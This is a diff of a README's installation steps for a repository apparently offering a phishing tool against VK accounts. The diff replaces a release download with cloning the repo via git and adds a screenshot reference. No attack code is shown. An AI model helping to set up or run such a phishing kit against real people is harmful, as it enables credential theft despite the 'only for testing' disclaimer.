@@ -6,11 +6,20 @@ This tool is ONLY FOR testing. Author is not responsible for anything you do wit
 
 ## Installation
 
-Install [node js and npm](https://nodejs.org/en/download/) if not installed yet
+1. Install [node js and npm](https://nodejs.org/en/download/) if not installed yet
 
-1. Go to [Releases](https://github.com/xxhax-team/vk-phishing/releases)
+2. Clone this repo
 
-2. Download the latest
+For that, open Terminal/CMD and execute command
+
+```BASH
+git clone https://github.com/xxhax-team/vk-phishing.git
+```
+
+Or download this repo as ZIP
+
+![Repo downloading guide](docs/how-to-clone.png)
+
 
 3. Unzip it into the folder
 
